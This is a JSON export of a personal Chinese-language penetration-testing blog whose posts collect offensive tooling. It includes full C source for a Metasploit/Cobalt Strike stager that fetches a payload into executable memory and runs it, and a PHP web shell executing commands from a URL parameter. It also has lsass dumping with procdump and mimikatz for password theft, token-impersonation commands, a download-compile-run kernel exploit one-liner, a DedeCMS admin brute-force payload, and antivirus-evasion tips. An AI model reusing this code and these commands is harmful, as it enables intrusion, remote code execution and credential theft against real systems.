{"meta":{"title":"Life's blog","subtitle":"","description":"","author":"Life","url":"http://life-time.me"},"pages":[{"title":"友链","date":"2017-11-12T12:29:21.000Z","updated":"2018-09-14T10:00:07.000Z","comments":true,"path":"links/index.html","permalink":"http://life-time.me/links/index.html","excerpt":"","text":"Fire ant Bing Crazy Szrzvdny Print ianony"},{"title":"project","date":"2017-12-12T11:43:57.000Z","updated":"2017-12-12T11:43:58.000Z","comments":true,"path":"project/index.html","permalink":"http://life-time.me/project/index.html","excerpt":"","text":""},{"title":"关于俺","date":"2016-05-24T05:45:13.000Z","updated":"2019-01-04T07:03:50.843Z","comments":false,"path":"about/index.html","permalink":"http://life-time.me/about/index.html","excerpt":"","text":"一个low逼，屌丝正在努力学习渗透喜欢填各种坑不喜欢二次元纸片人没事可以找我聊一下人生 就技术来说我是个辣鸡目前没有挖过一个洞不会日站懒得写文章 email:admin@life-time.me"},{"title":"Search","date":"2019-01-04T06:50:24.240Z","updated":"2019-01-04T06:50:24.240Z","comments":false,"path":"search/index.html","permalink":"http://life-time.me/search/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-12-30T15:08:36.250Z","updated":"2017-12-13T03:11:44.000Z","comments":true,"path":"tags/index.html","permalink":"http://life-time.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"custom loader","slug":"custom-loader","date":"2019-02-03T10:41:39.000Z","updated":"2019-02-03T16:31:48.782Z","comments":true,"path":"2019/02/03/custom-loader/","link":"","permalink":"http://life-time.me/2019/02/03/custom-loader/","excerpt":"","text":"一个msf和cobalt strike 都可以使用的loader msf和cobalt strike 皆使用Reflective DLL Injection 了解stager 借用msf的来说，看这 https://xz.aliyun.com/t/1709/1.连接到处理程序2.读取4字节长度3.分配长度字节缓冲区4.将其标记为可写和可执行（在Windows上，您需要VirtualProtect用于此）5.将长度字节读入该缓冲区6.跳转到缓冲区。在C中执行此操作的最简单方法是将其强制转换为函数指针并调用它。 通俗讲就是建立链接，接收dll，然后反射dll注入 附上一段测试代码来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c因cobalt strike 主为http和https的payload，选用https的stager直接拿msf的来用～反正都差不多～123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;#include &lt;wininet.h&gt;#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000/* ;0x80000000 | ; INTERNET_FLAG_RELOAD ;0x04000000 | ; INTERNET_NO_CACHE_WRITE ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT ;0x00000200 | ; INTERNET_FLAG_NO_UI ;0x00800000 | ; INTERNET_FLAG_SECURE ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID ;0x00001000 ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID*/#define OPTIONS_SECURITY_FLAGS 0x00003380 /* ;0x00002000 | ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID ;0x00001000 | ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID ;0x00000200 | ; SECURITY_FLAG_IGNORE_WRONG_USAGE ;0x00000100 | ; SECURITY_FLAG_IGNORE_UNKNOWN_CA ;0x00000080 ; SECURITY_FLAG_IGNORE_REVOCATION*/int main(int argc, char * argv[]) &#123; char * stage; void(*stage_main)(); HINTERNET hInternet; HINTERNET hHttpSession; HINTERNET hHttpRequest; int httpflags = OPTIONS_SECURITY_FLAGS; int recv_tmp = 0, recv_tot = 0; char *stage_index = NULL; /* We dont want the console prompt at screen */ FreeConsole(); /* Even it its SSL encrypted, lets set a User Agent, looks better :-) */ hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0); hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); /* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */ hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0); /* Set SSL options to the HTTP request */ InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4); HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0); /* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */ stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE); /* Read the payload from the previous http request and put it in our buffer */ recv_tmp = 1; recv_tot = 0; stage_index = stage; while (recv_tmp &gt; 0) &#123; InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp); recv_tot += recv_tmp; stage_index += recv_tmp; &#125; /* Just jump at the beginning of the buffer */ stage_main = (void(*)())stage; stage_main(); /* We dont have to care about it, but anyway .. */ InternetCloseHandle(hHttpSession); InternetCloseHandle(hInternet); return 0;&#125; 自行编译Usage：xxoo.exe ip port 什么，你说过不了杀毒？ 自己动手做咯，又不难～","categories":[],"tags":[{"name":"loader","slug":"loader","permalink":"http://life-time.me/tags/loader/"}]},{"title":"cobalt-strike-ms17-010-Cortana","slug":"cobalt-strike-ms-17-010","date":"2019-01-04T08:16:49.000Z","updated":"2019-01-04T08:30:47.114Z","comments":true,"path":"2019/01/04/cobalt-strike-ms-17-010/","link":"","permalink":"http://life-time.me/2019/01/04/cobalt-strike-ms-17-010/","excerpt":"","text":"根据powershell版的eternalblue脚本写了一个cobalt strike插件 演示图:后期加入批量与listeners选择","categories":[],"tags":[{"name":"cobalt strike","slug":"cobalt-strike","permalink":"http://life-time.me/tags/cobalt-strike/"}]},{"title":"wmiexec","slug":"wmiexec","date":"2018-09-16T11:27:59.000Z","updated":"2018-09-16T11:38:08.000Z","comments":true,"path":"2018/09/16/wmiexec/","link":"","permalink":"http://life-time.me/2018/09/16/wmiexec/","excerpt":"","text":"笔记…..最近搞内网的时候，特别需要用到这类的东西psexec又会留下痕迹，还是用wmiexec吧….地址:https://www.t00ls.net/viewthread.php?tid=21167= =混淆一下即可免杀～附上在线混淆地址:https://isvbscriptdead.com/vbs-obfuscator/","categories":[],"tags":[]},{"title":"token的利用之降权","slug":"token与降权","date":"2018-05-14T09:06:02.000Z","updated":"2018-09-26T14:39:27.000Z","comments":true,"path":"2018/05/14/token与降权/","link":"","permalink":"http://life-time.me/2018/05/14/token与降权/","excerpt":"","text":"唔，笔记，做个总结…. 当你提权拿到sys的时候，你想看个administrator屏幕啥的或者以这个权限执行啥啥的时候…(sys运行远控弹回来的是黑屏..) 之前这种我一般是sys弹到msf，迁移进程来降权到administrator执行…..然而…..迁移容易gg(别问为什么，这是个悲伤的事情) 最近刚好在了解假冒令牌..看到了大佬的文章 token三种方式123Windows(incognito.exe)Powershell(Invoke-TokenManipulation.ps1)Metasploit(load incognito或者steal_token) Windwos：https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip123incognito.exe list_tokens -u //列出所有tokenincognito.exe execute -c &quot;win-xxx\\\\administrator&quot; cmd.exe格式:incognito.exe execute [options] &lt;token&gt; &lt;command&gt; Powershell:https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1123Invoke-TokenManipulation -Enumerate 或者ShowAll //列出所有tokenInvoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\\system&quot; //提权到system更多的去看脚本里面的注释.... Metasploit: incognito1234load incognito 加载incognitolist_tokens -u 列出所有tokenimpersonate_token &quot;WIN-FV3F5ATOOP6\\\\Life&quot; 这里是需要双斜杠的..rev2self 或者drop_token 返回之前的token.. steal_token1234这个是从进程中窃取tokenpssteal_token piddrop_token","categories":[],"tags":[{"name":"令牌","slug":"令牌","permalink":"http://life-time.me/tags/令牌/"}]},{"title":"一个ms17-010的轮子","slug":"ms17-010轮子","date":"2018-05-08T11:08:56.000Z","updated":"2018-05-13T06:12:52.000Z","comments":true,"path":"2018/05/08/ms17-010轮子/","link":"","permalink":"http://life-time.me/2018/05/08/ms17-010轮子/","excerpt":"","text":"https://github.com/dust-life/Eternalblue-Doublepulsar-Metasploit-for-Windows唔，这是一个轮子，你可能会说没什么卵用，其实我也是这么认为的~ 原模块地址:https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit 这个模块算是我觉得在msf比较好用的了，直接wine调用exe打的，唔，效果和原版的一样但是苦于只能在linux上面使用，唔，然后我就想改改弄到win上面来用…配合pentestbox使用，里面的四个路径根据你的实际情况改~ 目前只支持reverse_tcp 其他payload请自行修改第94行代码~ 有什么不妥之处请提交issues 基本效果如下：","categories":[],"tags":[{"name":"ms17-010","slug":"ms17-010","permalink":"http://life-time.me/tags/ms17-010/"}]},{"title":"dump内存读密码(hash)","slug":"内存dump","date":"2018-05-08T03:30:47.000Z","updated":"2018-05-08T03:43:48.000Z","comments":true,"path":"2018/05/08/内存dump/","link":"","permalink":"http://life-time.me/2018/05/08/内存dump/","excerpt":"","text":"唔，记的笔记，某些情况下，比较有用，国外很多杀毒还是禁止dump进程的…. 密码会储存在 lsass进程中(08及以下可以读出明文密码)用procdump或者任务管理器将lsass进程转换为储存文件（procdump是微软的东西，白名单的）12procdump.exe -accepteula -ma lsass.exe MyDump.dmp （听说加了at不需要管理员权限）procdump.exe -ma lsass.exe MyDump.dmp 转换方法大全:https://www.cnblogs.com/jiangxueqiao/archive/2017/08/29/7447852.html打包回来用mimikatz读取:12sekurlsa :: Minidump MyDump.dmpsekurlsa :: logonPasswords 文章:https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php http://blog.digital-forensics.it/2014/03/mimikatz-offline-addendum_28.html https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/","categories":[],"tags":[{"name":"mimikatz","slug":"mimikatz","permalink":"http://life-time.me/tags/mimikatz/"}]},{"title":"php命令执行函数笔记","slug":"php命令执行","date":"2018-05-07T03:43:29.000Z","updated":"2018-05-07T04:04:21.000Z","comments":true,"path":"2018/05/07/php命令执行/","link":"","permalink":"http://life-time.me/2018/05/07/php命令执行/","excerpt":"","text":"唔，笔记。 命令执行函数:1234567systempassthruexec pcntl_exec（linux）shell_exec = ``(反单引号)popenproc_open ps:iis可以尝试调用com来执行命令 Wscript.Shell和Shell.Application 1234567&lt;?php$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;); $exec=$phpwsh-&gt;exec(&quot;cmd.exe /c &quot;.$_GET[&apos;c&apos;].&quot;&quot;); $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput; ?&gt; linux还可以尝试用LD_PRELOAD,扩展库绕过 参考链接:http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3","categories":[],"tags":[{"name":"php 命令执行","slug":"php-命令执行","permalink":"http://life-time.me/tags/php-命令执行/"}]},{"title":"搭建小飞机 SSR","slug":"ssr","date":"2018-04-18T03:15:57.000Z","updated":"2018-04-24T11:04:01.000Z","comments":true,"path":"2018/04/18/ssr/","link":"","permalink":"http://life-time.me/2018/04/18/ssr/","excerpt":"","text":"单用户的~ GitHub 地址 作者已经删除了该项目，下面这个是其他人fork的https://github.com/shadowsocksrr/shadowsocksr.git 部署先git下来 git clone https://github.com/shadowsocksrr/shadowsocksr.git 安装python以及pipubuntu: apt-get install python-gevent python-pip python-m2crypto python-wheel python-setuptools cd 到目录 cd shadowsocksr 初始化一下 ./initcfg.sh 修改配置文件(端口，密码，加密等) vim user-config.json 12345678910111213141516171819202122 &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;server_ipv6&quot;: &quot;::&quot;, &quot;server_port&quot;: 8388, //自定义端口 &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;m&quot;, //密码 &quot;timeout&quot;: 120, &quot;udp_timeout&quot;: 60, &quot;method&quot;: &quot;aes-128-ctr&quot;, //加密 &quot;protocol&quot;: &quot;auth_aes128_md5&quot;, //协议 &quot;protocol_param&quot;: &quot;&quot;, &quot;obfs&quot;: &quot;tls1.2_ticket_auth_compatible&quot;, //混淆，这里建议改成tls1.2_ticket_auth &quot;obfs_param&quot;: &quot;&quot;, &quot;speed_limit_per_con&quot;: 0, &quot;speed_limit_per_user&quot;: 0, &quot;dns_ipv6&quot;: false, &quot;connect_verbose_info&quot;: 0, &quot;redirect&quot;: &quot;&quot;, &quot;fast_open&quot;: false&#125; 改完保存，cd到shadowsocks chmod +x *.sh //给权限 启动服务： ./logrun.sh //后台运行如果要调试就python server.py，关闭终端就会断开 停止服务： ./stop.sh 查看日志： ./tail.sh","categories":[],"tags":[{"name":"小飞机","slug":"小飞机","permalink":"http://life-time.me/tags/小飞机/"}]},{"title":"更新msf5.0","slug":"ubuntu安装msf5-0","date":"2018-03-18T03:33:38.000Z","updated":"2018-05-08T11:42:25.000Z","comments":true,"path":"2018/03/18/ubuntu安装msf5-0/","link":"","permalink":"http://life-time.me/2018/03/18/ubuntu安装msf5-0/","excerpt":"","text":"= =之前就听说5.0出来了，一直懒得弄，报错一堆，不同ruby版本的报错还不一样，很难受……….环境:123ubuntu 17.10win的话，有空再填ruby 2.3.6p384 (2017-12-14) [x86_64-linux-gnu] (这个地方版本自己用rvm切换) 直接上命令，懒得截图报错了.1234git clone https://github.com/rapid7/metasploit-framework.gitcd metasploit-frameworksudo apt-get install libpq-dev ruby-dev libpcap-dev zlib1g-dev liblzma-dev libsqlite3-devbundle install ln -s 你值得拥有 emmmmmm","categories":[],"tags":[]},{"title":"ubuntu本地提权复现","slug":"ubuntu内核提权复现","date":"2018-03-16T09:29:03.000Z","updated":"2018-05-08T11:43:44.000Z","comments":true,"path":"2018/03/16/ubuntu内核提权复现/","link":"","permalink":"http://life-time.me/2018/03/16/ubuntu内核提权复现/","excerpt":"","text":"ubuntu本地提权exp:wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &amp;&amp;cd /tmp &amp;&amp; gcc -o exp upstream44.c &amp;&amp; chmod 777 exp &amp;&amp; ./exp 环境：1ubuntu 16.04.4 这个地方有点坑，ubuntu默认不安装gcc，还有一个莫名的报错，简直emmmmmmm。1apt-get install gcc libc6-dev","categories":[],"tags":[]},{"title":"dede通配符爆破后台~","slug":"dede通配符爆破后台","date":"2018-03-03T04:37:18.000Z","updated":"2018-05-08T11:44:52.000Z","comments":true,"path":"2018/03/03/dede通配符爆破后台/","link":"","permalink":"http://life-time.me/2018/03/03/dede通配符爆破后台/","excerpt":"","text":"emmmmmm，再也不用担心找不到dede的后台了~~(只支持win) exp(php):https://xianzhi.aliyun.com/forum/topic/2064 exp(python3):https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/ 这个地方要说一下，包含了common.inc.php的都可以跑….. 预防tags.php和index.php不能跑，这里我总结了一下可以利用的php: 这里二级目录爆破的话，exp的语句需要改一下 1dopost=save&amp;_FILES[b4dboy][tmp_name]=../$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif /install/module_autos.php /m/index.php /m/list.php /m/view.php /member/config.php /plus/ad_js.php /plus/advancedsearch.php /plus/arcmulti.php /plus/bookfeedback.php /plus/bookfeedback_js.php /plus/car.php /plus/carbuyaction.php /plus/comments_frame.php /plus/count.php /plus/digg_ajax.php /plus/digg_frame.php /plus/disdls.php /plus/diy.php /plus/download.php /plus/erraddsave.php /plus/feedback.php /plus/feedback_ajax.php /plus/feedback_js.php /plus/flink.php /plus/flink_add.php /plus/freelist.php /plus/guestbook.php /plus/heightsearch.php /plus/list.php /plus/mytag_js.php /plus/posttocar.php /plus/qrcode.php /plus/recommend.php /plus/rss.php /plus/search.php /plus/showphoto.php /plus/stow.php /plus/task.php /plus/view.php /plus/vote.php","categories":[],"tags":[{"name":"通配符","slug":"通配符","permalink":"http://life-time.me/tags/通配符/"}]},{"title":"win远程下载文件的各种姿势~","slug":"win-download","date":"2018-01-12T09:49:23.000Z","updated":"2018-01-12T10:02:51.000Z","comments":true,"path":"2018/01/12/win-download/","link":"","permalink":"http://life-time.me/2018/01/12/win-download/","excerpt":"","text":"收集了两篇关于win下的远程下载方式，仔细阅读了一下，才发现，原来这么强大~ http://www.cnblogs.com/backlion/p/7908563.html http://www.freebuf.com/articles/system/155147.html","categories":[],"tags":[{"name":"win 远程下载","slug":"win-远程下载","permalink":"http://life-time.me/tags/win-远程下载/"}]},{"title":"Eternalblue","slug":"Eternalblue","date":"2018-01-12T06:53:20.000Z","updated":"2018-05-06T11:12:53.000Z","comments":true,"path":"2018/01/12/Eternalblue/","link":"","permalink":"http://life-time.me/2018/01/12/Eternalblue/","excerpt":"","text":"最近一直在弄关于Eternalblue的东西，fb.py和msf的模块又不是很方便，所以去找了一下其他的利用工具原版: https://github.com/misterch0c/shadowbroker python: https://github.com/worawit/MS17-010 https://github.com/REPTILEHAUS/Eternal-Blue http://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/ https://www.anquanke.com/post/id/86309 (32位) https://www.anquanke.com/post/id/86562 (64位) https://www.exploit-db.com/exploits/41987/win: http://lu4n.com/ms17-010-exploit-green-version-without-python/ https://www.t00ls.net/thread-39405-1-1.htmlpowershell: https://github.com/EmpireProject/Empire/blob/master/data/module_source/exploitation/Exploit-EternalBlue.ps1","categories":[],"tags":[{"name":"ms17-010","slug":"ms17-010","permalink":"http://life-time.me/tags/ms17-010/"}]}]}